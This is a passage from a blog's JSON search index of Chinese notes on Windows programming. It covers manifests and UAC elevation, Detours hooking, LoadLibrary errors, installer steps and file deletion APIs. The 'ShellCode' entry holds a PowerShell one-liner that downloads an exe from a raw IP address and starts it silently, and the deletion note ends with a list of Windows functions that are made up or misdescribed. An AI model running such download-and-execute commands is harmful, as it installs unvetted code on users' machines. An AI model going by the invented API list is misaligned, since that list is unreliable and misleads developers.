Studio","slug":"Visual-Studio","permalink":"http://example.com/tags/Visual-Studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ShellCode","date":"2023-10-27T01:24:01.954Z","path":"A_OS/Windows/ShellCode/ShellCode/","text":"好文Windows Shellcode学习笔记——通过VisualStudio生成shellcode 1powershell.exe Invoke-WebRequest -Uri &#x27;https://10.218.80.215/client/360EPP145433958[10.218.80.215-8080]-W.exe&#x27; -OutFile &#x27;%temp%/360.tmp&#x27;; Rename-Item &#x27;%temp%/360.tmp&#x27; &#x27;%temp%/360EPP145433958[10.218.80.215-8080]-W.exe&#x27;; Start-Process &#x27;%temp%/360EPP145433958[10.218.80.215-8080]-W.exe&#x27; /S;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"shellcode","slug":"shellcode","permalink":"http://example.com/tags/shellcode/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"ShellCode","slug":"A-OS/Windows/ShellCode","permalink":"http://example.com/categories/A-OS/Windows/ShellCode/"}]},{"title":"RT_MAINFEST 文件","date":"2023-10-27T01:24:01.953Z","path":"A_OS/Windows/【win】RT_MAINFEST/","text":"概述: MAINFEST文件说明及相关使用 0x01、可以指定加载的dll可以通过修改 MAINFEST 文件内容来修改 dll 的加载位置。 示例：如下所示分别指定了 vcruntime140d.dll 、 ucrtbased.dll 、 libcrypto-3.dll 、libssl-3.dll 四个dll的加载路径 1234567&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27; standalone=&#x27;yes&#x27;?&gt;&lt;assembly xmlns=&#x27;urn:schemas-microsoft-com:asm.v1&#x27; manifestVersion=&#x27;1.0&#x27;&gt;&lt;file name=&quot;vcruntime140d.dll&quot; loadFrom=&quot;C:\\Users\\holdy\\Documents\\TestMySQL\\temp1\\vcruntime140d.dll&quot;&gt;&lt;/file&gt;&lt;file name=&quot;ucrtbased.dll&quot; loadFrom=&quot;C:\\Users\\holdy\\Documents\\TestMySQL\\temp1\\ucrtbased.dll&quot;&gt;&lt;/file&gt;&lt;file name=&quot;libcrypto-3.dll&quot; loadFrom=&quot;D:\\Documents\\A_Source\\WindowsTec\\Debug\\mysqlcppconn8-static-debug-openssl3-mtd\\libcrypto-3.dll&quot;&gt;&lt;/file&gt;&lt;file name=&quot;libssl-3.dll&quot; loadFrom=&quot;D:\\Documents\\A_Source\\WindowsTec\\Debug\\mysqlcppconn8-static-debug-openssl3-mtd\\libcrypto-3.dll&quot;&gt;&lt;/file&gt;&lt;/assembly&gt; 0x02、自动提升Vista、Win7上进程的权限–RT_MANIFEST很多时候自己开发的应用程序需要以更高的用户权限来运行，特别是在Vista、Win7下面。 如何使得自己编写的应用程序在运行时也如同下面的方式一样，提示权限提升。 方法： 按照通常方式，开发VC程序，编译、生成.exe文件； 在Debug或Release文件夹下面，新建一个“程序名+.exe+.manifest”的文件。若你生成的应用程序名称叫MyApp.exe，在MyApp.exe所在的目录下新建一个名称为MyApp.exe.manifest的文件，将该文件以文本方式打开（如notepad） 将下面的此段XML，粘贴到刚刚新建的MyApp.exe.manifest文件中，并保存。 12345678910&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27; standalone=&#x27;yes&#x27;?&gt;&lt;assembly xmlns=&#x27;urn:schemas-microsoft-com:asm.v1&#x27; manifestVersion=&#x27;1.0&#x27;&gt; &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt; &lt;security&gt; &lt;requestedPrivileges&gt; &lt;requestedExecutionLevel level=&#x27;requireAdministrator&#x27; uiAccess=&#x27;false&#x27; /&gt; &lt;/requestedPrivileges&gt; &lt;/security&gt; &lt;/trustInfo&gt;&lt;/assembly&gt; requestedExecutionLevel元素中的“level”属性可以取下面的值（比较简单的英文，相信大家都能看懂）。 运行.Net Visual Studio命令提示符（注意是.Net下类似cmd.exe的工具，不是Windows附件里面的cmd.exe）。如果你安装了Visual Studio .Net 2003 或 2005 、2008、2010等开发工具，在开始菜单-&gt;Visual Studio 2003或2005-&gt;Visual Studio工具下面可以找到该工具。 运行.Net Visual Studio命令提示符之后，将当前目录更改到你应用程序（MyApp.exe）所在的目录下面，之后输入如下命令： mt.exe -manifest “MyApp.exe.manifest” -outputresource:”MyApp.exe”;#1 （此处的MyApp要替换成你自己应用程序的名字） 之后再到你应用程序的目录下面就会看到，现在应用程序的图标比原来多了一个安全盾。运行程序就会出现提示。 注：如果您开发的是动态链接库DLL。则在.Net Visual Studio命令提示符中输入的命令应该为： 1mt.exe -manifest &quot;MyApp.dll.manifest&quot; -outputresource:&quot;MyApp.dll&quot;;#2 。 最后，读者不妨自己测试一下本文所讲的方法，在Vista或Win7系统下，编写一个修改系统时间的简单应用，在不采用此方法之前，看能否修改成功。如果不能试试本文讲述的方法，然后运行程序再看看能否修改成功。 修改系统时间的代码如下： COleDateTime tm; SYSTEMTIME st; tm.ParseDateTime(_T(“2000-10-10 17:00:00”)); tm.GetAsSystemTime(st); SetLocalTime(&amp;st); 在Vista下提升应用程序的执行权限在 vista系统应用程序执行时默认不会使用超级用户权限,这会使一些创建文件和目录的IO操作失败,出现访问错误.这种现象是因为Vista的UAC特性 引起的. 要避免这种情况,可以强制用户在运行应用程序时以超级用户权限执行程序.具体做法: 编辑manifest文 件. 在manifest文件中配置好应用程序执行时需要的参数和执行环境.下面是一个实际例子: 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt; &lt;assemblyIdentity version=&quot;1.0.0.0&quot; processorArchitecture=&quot;X86&quot; name=&quot;IsUserAdmin&quot; type=&quot;win32&quot;/&gt; &lt;description&gt;Description of your application&lt;/description&gt; &lt;!-- Identify the application security requirements. --&gt; &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt; &lt;security&gt; &lt;requestedPrivileges&gt; &lt;requestedExecutionLevel level=&quot;requireAdministrator&quot; uiAccess=&quot;false&quot;/&gt; &lt;/requestedPrivileges&gt; &lt;/security&gt; &lt;/trustInfo&gt; &lt;/assembly&gt; 编辑应用程序的资源文件(rc后缀的文件),在其中加入下面两行代码: 1#define MANIFEST_RESOURCE_ID 1MANIFEST_RESOURCE_ID RT_MANIFEST &quot;&#123;Application.exe&#125;.manifest&quot; 其中 Application.exe 替换成要编译生成的可执行文件名. 编译链接程序,生成可执行应用程序. 运行 mt.exe命令,把manifest文件和生成的可执行程序链接起来.把manifest内容写入可执行文件.命令行为: 1mt.exe –manifest temp.manifest –outputresource:YourApp.exe;#1 到这一步,生成的可执行文件就可以在vista下运行时弹出UAC确认框,让用户确认以超级用户权限执行应用程序.","tags":[{"name":"dll","slug":"dll","permalink":"http://example.com/tags/dll/"},{"name":"exe","slug":"exe","permalink":"http://example.com/tags/exe/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"Procmon 过滤用法","date":"2023-10-27T01:24:01.952Z","path":"A_OS/Windows/【win】Procmon用法/","text":"Application Details – Process Name：产生事件的那个进程的名字 – Image Path：进程镜像的完整路径 – Command Line：命令行，用于启动进程 – Company Name：进程镜像文件中的企业名称。这个文本是由应用程序的开发者来定义的 – Description：进程镜像文件中的产品描述信息。这个文本是由应用程序的开发者定义的 – Version：进程镜像文件中的产品版本号。这个文本是由应用程序的开发者定义的 Event Details – Sequence Number：操作在全体事件中的相对位置，也包括当前的过滤 – Event Class：事件的类别（文件，注册表，进程） – Operation：特殊事件操作，比如Read、RegQueryValue等 – Date &amp; Time：操作的日期和时间 – Time of Day：只是操作的时间 – Path：一个事件引用资源的路径 – Detail：事件的附加信息 – Result：一个完成了的操作的状态码 – Relative Time：一个操作相对于Process Monitor的启动后的时间，或者相对于Process Monitor的信息清除后的时间 – Duration：一个已经完成了的操作所持续的时间 Process Management – User Name：正在执行操作的进程的用户账户名 – Session ID：正在执行操作的进程的Windows会话ID – Authentication ID：正在执行操作的进程的登录会话ID – Process ID：执行了操作的进程的进程ID – Thread ID：执行了操作的线程的线程ID – Integrity Level：正在运行的进程执行操作时的可信级别（仅支持Vista以上系统） – Virtualized：执行了操作的进程的虚拟化状态 删除文件 删除 _del. 重命名并删除 trustdservice.exe -&gt; trustservice_del.exe （以下文件均改为”文件名_del.ext”） trustfixservice.exe ServiceDetect.dll libgcommon.dll TrustAgent.exe TrustAgentApp.dll trustcore.dll trustnc.dll trustproxy.dll trustproxyserver.dll trustcheck.exe trustproxy64.sys trustproxy.sys vpnvnic.sys QInstUtils.exe ClientLogTool.exe QtWebEngineProcess.exe TrustAgent.config TrustAgentExtra.config 重命名完成之后会删除以上文件 结束进程 trustservice TrustAgent QtWebEngineProcess trustdservice trustfixservice 释放文件 文件 虚拟网卡驱动 代理驱动 trustservice trustfixservice.exe ServiceDetect.dll libgcommon.dll TrustAgent.exe TrustAgentApp.dll trustcore.dll trustnc.dll trustproxy.dll trustproxyserver.dll trustcheck.exe trustproxy64.sys trustproxy.sys vpnvnic.sys QInstUtils.exe ClientLogTool.exe QtWebEngineProcess.exe 目录 qtdepends oemdepends cert 删除旧的快捷方式 国信安全接入.lnk 青鸾安全接入.lnk TrustAgent.lnk 零信任客户端.lnk 清理路由调用安装目录下 ClearHost.exe 更新配置文件 TrustAgent.config TrustAgentExtra.config 更新注册表注册表路径 1!define PRODUCT_UNINST_KEY &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\$&#123;PRODUCT_NAME&#125;&quot; 更新字段 DisplayName Publisher DisplayIcon UninstallString DisplayVersion InstallDir ProxyVersion InstParams 配置崩溃状态配置系统LocalDumps，设置相关注册表项 启动 YMDbg.exe直接启动 $INSTALLDIR\\Dbg\\Ymdbg.exe 1Exec YMDbg.exe -i1","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"windows进程间通信整理","date":"2023-10-27T01:24:01.951Z","path":"A_OS/Windows/IPC/windows进程间通信/","text":"概述：windows进程间通信的各种方式 graph LR A(windows进程间通信) --> B[\"管道(pipe)\"] A --> C[\"邮件槽(Mailslots)\"] A --> D[\"文件映射(fileMapping)\"] A --> E[\"信号量(Semaphore)\"] A --> F[\"信号(signal)\"] A --> G[\"套接字(Socket)\"] A --> H[\"动态库(dll)\"] A --> I[\"组件对象模型(COM)\"] B --> B1[\"匿名管道(Anonymous pipe)\"] B --> B2[\"命名管道(named pipe)\"] D --> D1[\"共享内存(shared memory)\"] F --> F1[\"windows没有信号这个概念，但是会提供类似功能的api，比如杀死进程。linux下的kill信号，windows下提供TerminateProcess\"] H --> H1[\"地址无关代码：两个进程无法通过同一个dll进行数据交换\"]","tags":[{"name":"IPC","slug":"IPC","permalink":"http://example.com/tags/IPC/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"IPC","slug":"A-OS/Windows/IPC","permalink":"http://example.com/categories/A-OS/Windows/IPC/"}]},{"title":"LoadLibrary加载失败，返回126","date":"2023-10-27T01:24:01.950Z","path":"A_OS/Windows/GetLastError/126/","text":"[toc] 问题描述：在某一个windows环境中，安装了一个服务d，服务d的启动依赖于一个关键的dll文件(info.dll)，一直服务进程的dll也存在，但是在服务启动的时候，使用 LoadLibrary 函数会返回GetLastError 126。 排查手段记录已经尝试过的排查手段包括但不限于： 使用绝对路径加载dll1234// oldLoadLibrary(&quot;info.dll&quot;);// newLoadLibrary(&quot;C:\\\\info.dll&quot;); 问题关键","tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"GetLastError","slug":"GetLastError","permalink":"http://example.com/tags/GetLastError/"},{"name":"LoadLibrary","slug":"LoadLibrary","permalink":"http://example.com/tags/LoadLibrary/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"GetLastError","slug":"A-OS/Windows/GetLastError","permalink":"http://example.com/categories/A-OS/Windows/GetLastError/"}]},{"title":"Detours的使用","date":"2023-10-27T01:24:01.948Z","path":"A_OS/Windows/【win】Detours/","text":"概述：Detours 的说明和简单使用 DetoursDetours 是微软提供的一套工具，主要用于win32 API的拦截 Github：microsoft&#x2F;Detours: Detours is a software package for monitoring and instrumenting API calls on Windows. It is distributed in source code form. 仓库中有挺多示例程序可供参考。 使用 Detours 的大致流程： 在 Detours 的工作过程中，DetourTransactionBegin 函数首先用于启动一个截获（Hook）或解除截获（Unhook）的过程，这个过程中可能包含对多个函数的修改。然后，开发者可以使用 DetourAttach 或 DetourAttachEx 函数将 Detour 钩子附加到目标函数上，或使用 DetourDetach 函数将钩子从目标函数中分离出来。 相关函数说明DetourUpdateThread 函数说明DetourUpdateThread 函数是 Detours 库中的一个重要函数，用于在 Detour 事务处理过程中将特定的线程列入更新范围。Detours 是一个用于在运行时修改二进制代码（如函数钩子）的库，它允许开发者在不修改原始代码的情况下，拦截和修改函数的执行流程。 DetourUpdateThread 函数的作用是在这个事务过程中，将一个或多个线程列入需要更新的范围。这是因为在多线程环境中，直接修改函数的代码可能会导致竞态条件，即一个线程正在执行原始代码时，另一个线程可能已经修改了该代码。通过 DetourUpdateThread 将线程列入更新范围，Detours 库可以确保在事务提交时，所有相关线程的代码都被正确地更新，从而避免竞态条件。 具体来说，DetourUpdateThread 函数的作用是： 将指定的线程加入到 Detour 事务的更新列表中。 在事务提交时，Detours 库会遍历这个更新列表，并对列表中的每个线程执行必要的代码更新操作。 需要注意的是，在调用 DetourTransactionCommit 或 DetourTransactionCommitEx 函数提交事务之前，所有的附加、分离和线程更新操作都不会生效。一旦事务被提交，所有的修改就会立即生效，所有相关线程的代码都会被更新以反映这些修改。 因此，DetourUpdateThread 函数是 Detours 库中用于确保多线程环境下代码修改一致性和安全性的重要工具之一。 可以看下 DetourUpdateThread 的源码，如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041LONG WINAPI DetourUpdateThread(_In_ HANDLE hThread)&#123; LONG error; // If any of the pending operations failed, then we don&#x27;t need to do this. if (s_nPendingError != NO_ERROR) &#123; return s_nPendingError; &#125; // Silently (and safely) drop any attempt to suspend our own thread. if (hThread == GetCurrentThread()) &#123; return NO_ERROR; &#125; DetourThread *t = new NOTHROW DetourThread; if (t == NULL) &#123; error = ERROR_NOT_ENOUGH_MEMORY; fail: if (t != NULL) &#123; delete t; t = NULL; &#125; s_nPendingError = error; s_ppPendingError = NULL; DETOUR_BREAK(); return error; &#125; if (SuspendThread(hThread) == (DWORD)-1) &#123; error = GetLastError(); DETOUR_BREAK(); goto fail; &#125; t-&gt;hThread = hThread; t-&gt;pNext = s_pPendingThreads; s_pPendingThreads = t; return NO_ERROR;&#125; hookDemo修改 GetLocalTime ，使其返回的分钟数为 52 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;Windows.h&gt;//包含Detour的头文件和库文件#include &quot;detours.h&quot;#pragma comment (lib,&quot;detours.lib&quot;)using namespace std;//保存函数原型（用指针存储要拦截的API）void (*OldGetLocalTime)(LPSYSTEMTIME) = GetLocalTime;//拦截后要执行的操作（这里是将时间的分改为52）void NewGetLocalTime(LPSYSTEMTIME lpSystemTime) &#123; OldGetLocalTime(lpSystemTime); lpSystemTime-&gt;wMinute = 52;&#125;//下钩子函数void StartHook() &#123; //开始事务 DetourTransactionBegin(); //更新线程信息 DetourUpdateThread(GetCurrentThread()); //将拦截的函数附加到原函数的地址上 DetourAttach(&amp;(PVOID&amp;)OldGetLocalTime, NewGetLocalTime); //结束事务 DetourTransactionCommit();&#125;//撤钩子函数void EndHook() &#123; //开始detours事务 DetourTransactionBegin(); //更新线程信息 DetourUpdateThread(GetCurrentThread()); //将拦截的函数从原函数的地址上解除 DetourDetach(&amp;(PVOID&amp;)OldGetLocalTime, NewGetLocalTime); //结束detours事务 DetourTransactionCommit();&#125;int main()&#123; //获取本地时间 SYSTEMTIME time, time2; GetLocalTime(&amp;time); cout &lt;&lt; time.wHour &lt;&lt; &quot;:&quot; &lt;&lt; time.wMinute &lt;&lt; endl; //下钩子 StartHook(); //下钩子后再次获取本地时间 GetLocalTime(&amp;time2); cout &lt;&lt; time2.wHour &lt;&lt; &quot;:&quot; &lt;&lt; time2.wMinute &lt;&lt; endl; //撤钩子 EndHook(); return 0;&#125;","tags":[{"name":"hook","slug":"hook","permalink":"http://example.com/tags/hook/"},{"name":"Detours","slug":"Detours","permalink":"http://example.com/tags/Detours/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【API】FormatMessage函数的使用","date":"2023-10-27T01:24:01.948Z","path":"A_OS/Windows/API/FormatErrMessage/","text":"概述：FormatMessage 函数的使用 1234567891011121314151617181920212223242526272829303132333435363738394041424344const char* SPErrMsg(int errcode)&#123; static char _g_inner_msg[1024]; memset(_g_inner_msg, 0, sizeof(_g_inner_msg));#if SP_PLATFORM==SP_PLATFORM_WINDOWS if (0==errcode) &#123; errcode = GetLastError(); &#125; LPTSTR buf = NULL; if (::FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errcode, MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US) /* MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT) */, (LPTSTR)&amp;buf, 0, NULL)) &#123; // DWORD language_id // MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT) // MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US) // MAKELANGID(LANG_CHINESE_SIMPLIFIED, SUBLANG_CHINESE_SIMPLIFIED) // MAKELANGID(LANG_CHINESE_TRADITIONAL, SUBLANG_CHINESE_TRADITIONAL) int len = snprintf(_g_inner_msg, sizeof(_g_inner_msg), &quot; [%d]%s&quot;, errcode, buf); if ( len&gt;2 &amp;&amp; _g_inner_msg[len-1]==&#x27;\\n&#x27; &amp;&amp; _g_inner_msg[len-2]==&#x27;\\r&#x27; ) &#123; _g_inner_msg[len - 1] = &#x27;\\0&#x27;; _g_inner_msg[len - 2] = &#x27;\\0&#x27;; &#125; ::LocalFree(buf); &#125; else &#123; snprintf(_g_inner_msg, sizeof(_g_inner_msg), &quot; [%d]Unknown error %d&quot;, errcode, errcode); &#125;#else // https://stackoverflow.com/questions/3219393/stdlib-and-colored-output-in-c if (0==errcode) &#123; errcode = errno; errno = errcode; &#125; snprintf(_g_inner_msg, sizeof(_g_inner_msg), &quot; [%d]%s&quot;, (int)errcode, strerror(errcode));#endif return (_g_inner_msg);&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【Win】加载动态库 (loadlibrary)","date":"2023-10-27T01:24:01.947Z","path":"A_OS/Windows/【win】API_加载动态库/","text":"概述：通过 using 给导出函数起别名 [toc] 加载 using的用法参考 使用using起别名 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &quot;PipeIPC/PipeIPC.h&quot;int main()&#123; std::cout &lt;&lt; &quot;--- DLL Test ---\\n&quot;; HINSTANCE hDLL; // Handle to DLL using Face = int * (*)(int,int); hDLL = LoadLibrary(L&quot;mydll.dll&quot;); if (hDLL != NULL) &#123; Face faceSum = (Face)GetProcAddress(hDLL, &quot;mySum&quot;); if (!faceSum) &#123; // handle the error FreeLibrary(hDLL); return 0; &#125; else &#123; // call the function faceSum(1,1); &#125; &#125; return 0;&#125; 生成动态库dllmain.cpp1234567891011121314151617181920212223#ifdef __cplusplusextern &quot;C&quot;&#123;#endif #define MYIMAPI extern &quot;C&quot; __declspec(dllimport)#define MYEXAPI extern &quot;C&quot; __declspec(dllexport)#ifdef __cplusplus&#125;#endifMYEXAPI int Add(int numa, int numb)&#123; return numa + numb;&#125;MYEXAPI int Sub(int numa, int numb)&#123; return (numa - numb);&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"DLL","slug":"DLL","permalink":"http://example.com/tags/DLL/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【WINAPI】系统获取系统主机域名","date":"2023-10-27T01:24:01.946Z","path":"A_OS/Windows/API/获取系统域名/","text":"概述：windows操作系统下获取主机域名 主要调用 DsRoleGetPrimaryDomainInformation 这个函数。 1234567891011121314151617181920212223242526272829303132333435363738// GetDominName.cpp : 获取主机域名//#include &lt;Windows.h&gt;#include &lt;DSRole.h&gt;#pragma comment(lib, &quot;netapi32.lib&quot;)#include &lt;stdio.h&gt;int main(int argc, char ** argv)&#123; DSROLE_PRIMARY_DOMAIN_INFO_BASIC * info; DWORD dw; dw = DsRoleGetPrimaryDomainInformation(NULL, DsRolePrimaryDomainInfoBasic, (PBYTE *)&amp;info); if (dw != ERROR_SUCCESS) &#123; wprintf(L&quot;DsRoleGetPrimaryDomainInformation: %u\\n&quot;, dw); return dw; &#125; if (info-&gt;DomainNameDns == NULL) &#123; wprintf(L&quot;DomainNameDns is NULL\\n&quot;); &#125; else &#123; wprintf(L&quot;DomainNameDns: %s\\n&quot;, info-&gt;DomainNameDns); &#125; system(&quot;pause&quot;); return 0;&#125; 输出示例：","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"winapi","slug":"winapi","permalink":"http://example.com/tags/winapi/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【API】删除文件夹下所有文件","date":"2023-10-27T01:24:01.945Z","path":"A_OS/Windows/API/删除文件目录下的所有文件/","text":"概述： 调用 Windows API 遍历、删除文件，涉及到的API接口： deletefile、RemoveDirectory、MoveFileExA、 MoveFile123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;windows.h&gt;#include &lt;winbase.h&gt;#include &lt;WinUser.h&gt;#include &lt;strsafe.h&gt;#include &lt;ShObjIdl.h&gt;#include &lt;cstring&gt;#include &lt;shlobj.h&gt;#include &lt;comutil.h&gt; #include &lt;io.h&gt;#pragma comment(lib, &quot;comsuppw.lib&quot;)#pragma comment(linker, &quot;/entry:mainCRTStartup&quot;) // 设置系统重启时删除bool _SetFileRebootDelete(const std::string&amp; file_path) &#123; if (MoveFileExA(file_path.c_str(), 0, MOVEFILE_DELAY_UNTIL_REBOOT)) &#123; return true; &#125; else &#123; return false; &#125;&#125;void getFiles(std::string path, std::vector&lt;std::string&gt;&amp; files, std::vector&lt;std::string&gt;&amp; names)&#123; //文件句柄，win10用long long，win7用long就可以了 long hFile = 0; //文件信息 struct _finddata_t fileinfo; std::string p; if ((hFile = _findfirst(p.assign(path).append(&quot;\\\\*&quot;).c_str(), &amp;fileinfo)) != -1) &#123; do &#123; //如果是目录,迭代之 //如果不是,加入列表 if ((fileinfo.attrib &amp; _A_SUBDIR)) &#123; if (strcmp(fileinfo.name, &quot;.&quot;) != 0 &amp;&amp; strcmp(fileinfo.name, &quot;..&quot;) != 0) &#123; getFiles(p.assign(path).append(&quot;\\\\&quot;).append(fileinfo.name), files, names); &#125; &#125; else &#123; files.push_back(p.assign(path).append(&quot;\\\\&quot;).append(fileinfo.name)); names.push_back(fileinfo.name); &#125; &#125; while (_findnext(hFile, &amp;fileinfo) == 0); _findclose(hFile); &#125;&#125;std::string GetLoactionDir()&#123; DWORD dwLen = 0; CHAR szAppDataDir[MAX_PATH]; dwLen = ExpandEnvironmentStringsA(&quot;%programdata%&quot;, szAppDataDir, MAX_PATH); if (dwLen != 0) &#123; StringCchCatA(szAppDataDir, sizeof(szAppDataDir), (&quot;\\\\TrustAgent\\\\logs&quot;)); &#125; return szAppDataDir;&#125;int GetWithRegex() &#123; // 定义文件查找句柄和查找条件 WIN32_FIND_DATAA findData; HANDLE hFind = INVALID_HANDLE_VALUE; LPCSTR lpPath = &quot;D:\\\\Documents\\\\B_Tools\\\\&quot;; // 查找路径，这里以C盘根目录为例 LPCSTR lpPattern = &quot;*.7z&quot;; // 查找模式，这里匹配所有文件 char buffer_1[MAX_PATH] = &quot;&quot;; char* lpStr1; lpStr1 = buffer_1; PathCombineA(lpStr1, lpPath, lpPattern); // 调用FindFirstFile函数开始查找文件 hFind = FindFirstFileA(lpStr1, &amp;findData); if (hFind == INVALID_HANDLE_VALUE) &#123; std::cout &lt;&lt; &quot;FindFirstFile failed with error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return 1; &#125; // 循环遍历查找结果并输出文件名 do &#123; std::cout &lt;&lt; findData.cFileName &lt;&lt; std::endl; &#125; while (FindNextFileA(hFind, &amp;findData)); // 关闭文件查找句柄 FindClose(hFind); return 0;&#125;int main()&#123; using namespace std; std::string filepath = GetLoactionDir(); vector&lt;string&gt; files; vector&lt;string&gt; names; getFiles(filepath, files, names); for (int i = 0; i &lt; files.size(); i++) &#123; printf(&quot;-----========files:%d========---\\n&quot;, i); // cout &lt;&lt; &quot;files&quot; &lt;&lt; i &lt;&lt; &#x27;:&#x27; &lt;&lt; files[i] &lt;&lt; endl; // wstring wsName; // wsName = string2wstring(files[i]); cout &lt;&lt; &quot;lnkPath: &quot; &lt;&lt; files[i] &lt;&lt; endl; // wstring wsDestPath = getLnkFormPath(wsName); // cout &lt;&lt; &quot;destPath:&quot;; // wcout &lt;&lt; wsDestPath; // cout &lt;&lt; endl; _SetFileRebootDelete(files[i]); &#125; return 0;&#125; deletefile123456789101112131415161718#include &lt;Windows.h&gt; int main() &#123; LPCWSTR filePath = L&quot;C:\\\\Path\\\\To\\\\File.txt&quot;; if (DeleteFile(filePath)) &#123; // 文件删除成功 printf(&quot;文件删除成功！\\n&quot;); &#125; else &#123; // 文件删除失败 printf(&quot;文件删除失败！\\n&quot;); &#125; return 0; &#125; RemoveDirectory123456789101112131415161718#include &lt;Windows.h&gt; int main() &#123; LPCWSTR directoryPath = L&quot;C:\\\\Path\\\\To\\\\Directory&quot;; if (RemoveDirectory(directoryPath)) &#123; // 目录删除成功 printf(&quot;目录删除成功！\\n&quot;); &#125; else &#123; // 目录删除失败 printf(&quot;目录删除失败！\\n&quot;); &#125; return 0; &#125; 补充除了DeleteFile和RemoveDirectory之外，Windows API 还提供了其他一些用于删除文件或目录的函数。以下是其中一些常用的函数： DeleteVolumeMountPoint: 该函数用于删除一个装载点的所有卷装信息。 RemoveDirectoryEx: 该函数用于删除一个目录及其所有子目录和文件。 RemoveFile: 该函数用于删除一个文件，但不会删除与该文件关联的目录。 MoveFile: 该函数可以将一个文件或目录从一个位置移动到另一个位置，如果目标位置已经存在同名文件或目录，则会自动将其覆盖。 MoveFileEx: 该函数可以将一个文件或目录从一个位置移动到另一个位置，同时可以指定不同的覆盖行为。 SetFileAttributes: 该函数可以设置一个文件或目录的属性，例如只读、隐藏、系统等。 DeleteFileTransacted: 该函数可以删除一个文件，并将其从回收站中清空。 DeleteSubdirectoriesAndFiles: 该函数可以删除一个目录及其所有子目录和文件，并将其从回收站中清空。","tags":[{"name":"API","slug":"API","permalink":"http://example.com/tags/API/"},{"name":"删除文件","slug":"删除文件","permalink":"http://example.com/tags/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"VirtualProtect 函数","date":"2023-10-27T01:24:01.941Z","path":"A_OS/Windows/API/VirtualProtect/","text":"概述：VirtualProtect 函数的说明和使用 说明VirtualProtect 函数主要用于改变内存地址所在页的页属性。 123456BOOL VirtualProtect( LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); 各参数的意义为： lpAddress，要改变属性的内存起始地址。 